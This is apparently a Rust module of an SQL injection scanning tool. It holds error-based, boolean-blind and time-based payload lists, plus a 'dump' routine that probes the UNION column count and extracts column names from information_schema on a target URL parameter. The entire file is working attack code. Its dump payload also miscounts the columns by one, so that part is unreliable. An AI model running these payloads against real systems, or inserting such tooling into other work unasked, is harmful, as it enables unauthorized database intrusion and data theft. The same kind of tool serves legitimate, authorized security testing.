use colored::Colorize;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct SqliFinding {
    payload: String,
    vuln_type: String,
    evidence: String,
    severity: String,
}

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const ERROR_PATTERNS: &[&str] = &[
    "SQL syntax", "mysql_fetch", "ORA-", "SQLSTATE", "PG::SyntaxError",
    "Microsoft SQL Server", "ODBC SQL Server Driver", "SQLite3::SQLException",
    "SQLite::Query", "PSQLException", "valid MySQL result", "check the manual",
    "MySQLSyntaxErrorException", "mariadb", "Unknown column", "syntax error at",
];

const ERROR_PAYLOADS: &[&str] = &[
    "'", "\"", "'", "';", "\";", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR '1'='1' --", "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
    "') OR ('1'='1", "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
    "' AND BENCHMARK(50000000,MD5('x'))--",
];

pub async fn error_scan(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SQLi Error-Based Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut findings = Vec::new();

    for payload in ERROR_PAYLOADS {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                for pattern in ERROR_PATTERNS {
                    if body.to_lowercase().contains(&pattern.to_lowercase()) {
                        findings.push(SqliFinding {
                            payload: payload.to_string(),
                            vuln_type: "Error-based SQLi".to_string(),
                            evidence: pattern.to_string(),
                            severity: "HIGH".to_string(),
                        });
                        println!("{} [HIGH] Error-based SQLi detected!", "[!]".red().bold());
                        println!("  {} Payload:  {}", "•".cyan(), payload);
                        println!("  {} Pattern:  {}", "•".cyan(), pattern);
                        println!("  {} Status:   {}", "•".cyan(), status);
                        break;
                    }
                }
            }
            Err(_) => {}
        }
    }

    if findings.is_empty() {
        println!("{} No error-based SQLi detected.", "[-]".yellow().bold());
    } else {
        println!("\n{} {} finding(s)", "[*]".cyan().bold(), findings.len());
    }
    Ok(())
}

pub async fn blind_scan(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SQLi Boolean-Based Blind Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let true_payload = format!("{} AND 1=1", "1");
    let false_payload = format!("{} AND 1=2", "1");

    let true_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, true_payload);
    let false_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, false_payload);

    let true_resp = client.get(&true_url).send().await?;
    let true_status = true_resp.status();
    let true_body = true_resp.text().await.unwrap_or_default();
    let true_len = true_body.len();

    let false_resp = client.get(&false_url).send().await?;
    let false_status = false_resp.status();
    let false_body = false_resp.text().await.unwrap_or_default();
    let false_len = false_body.len();

    println!("{} True condition (AND 1=1):  {} bytes, status {}", "[*]".cyan().bold(), true_len, true_status);
    println!("{} False condition (AND 1=2): {} bytes, status {}", "[*]".cyan().bold(), false_len, false_status);

    if true_len != false_len {
        println!("\n{} [HIGH] Boolean-based blind SQLi detected!", "[!]".red().bold());
        println!("  {} Response size differs between true/false conditions", "•".cyan());
        println!("  {} Delta: {} bytes", "•".cyan(), true_len as i64 - false_len as i64);
    } else if true_body != false_body {
        println!("\n{} [HIGH] Boolean-based blind SQLi detected!", "[!]".red().bold());
        println!("  {} Response content differs despite same size", "•".cyan());
    } else {
        println!("\n{} No boolean-based blind SQLi detected.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn time_scan(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} SQLi Time-Based Blind Scan", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout + 10, token);

    let baseline_start = Instant::now();
    let baseline_url = format!("{}{}{}=1", url, if url.contains('?') { "&" } else { "?" }, param);
    let _ = client.get(&baseline_url).send().await?;
    let baseline_time = baseline_start.elapsed();

    println!("{} Baseline response time: {:.2}s", "[*]".cyan().bold(), baseline_time.as_secs_f64());

    let sleep_payloads = [
        ("MySQL SLEEP", "1 AND SLEEP(5)--"),
        ("MySQL BENCHMARK", "1 AND BENCHMARK(50000000,MD5('x'))--"),
        ("PostgreSQL pg_sleep", "1; SELECT pg_sleep(5)--"),
        ("MSSQL WAITFOR", "1; WAITFOR DELAY '0:0:5'--"),
        ("SQLite randomblob", "1 AND randomblob(100000000)--"),
    ];

    let mut found = false;
    for (name, payload) in &sleep_payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        let start = Instant::now();
        match client.get(&test_url).send().await {
            Ok(_) => {}
            Err(_) => {}
        }
        let elapsed = start.elapsed();

        let delayed = elapsed.as_secs_f64() > baseline_time.as_secs_f64() + 4.0;
        let status = if delayed { "DELAYED".red().bold() } else { "normal".green() };
        println!("  {} {:25} {:>7.2}s  {}", "•".cyan(), name, elapsed.as_secs_f64(), status);

        if delayed {
            found = true;
            println!("{} [HIGH] Time-based blind SQLi via {}!", "[!]".red().bold(), name);
        }
    }

    if !found {
        println!("\n{} No time-based blind SQLi detected.", "[-]".yellow().bold());
    }
    Ok(())
}

pub async fn dump(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
    table: &str,
) -> anyhow::Result<()> {
    println!("{} SQLi Data Dump", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL:   {}", "[*]".cyan().bold(), url);
    println!("{} Param: {}", "[*]".cyan().bold(), param);
    println!("{} Table: {}", "[*]".cyan().bold(), table);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let union_payload = format!("1 UNION SELECT NULL,NULL,NULL,NULL--");
    let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, union_payload);

    let resp = client.get(&test_url).send().await?;
    let body = resp.text().await.unwrap_or_default();

    println!("{} Testing UNION injection with column count probe...", "[*]".cyan().bold());

    for n in 1..=10 {
        let cols: Vec<&str> = (0..n).map(|_| "NULL").collect();
        let payload = format!("1 UNION SELECT {}--", cols.join(","));
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
        let resp = client.get(&test_url).send().await?;
        let resp_body = resp.text().await.unwrap_or_default();

        if !resp_body.is_empty() && resp_body.len() > body.len() + 50 {
            println!("{} [+] UNION works with {} columns", "[+]".green().bold(), n);

            let dump_payload = format!("1 UNION SELECT group_concat(column_name),NULL{} FROM information_schema.columns WHERE table_name='{}'--",
                ",NULL".repeat(n - 1), table);
            let dump_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, dump_payload);
            let resp = client.get(&dump_url).send().await?;
            let dump_body = resp.text().await.unwrap_or_default();

            println!("{} Columns in '{}':", "[*]".cyan().bold(), table);
            println!("  {}", dump_body.chars().take(500).collect::<String>());
            return Ok(());
        }
    }

    println!("{} Could not determine UNION column count.", "[-]".yellow().bold());
    Ok(())
}
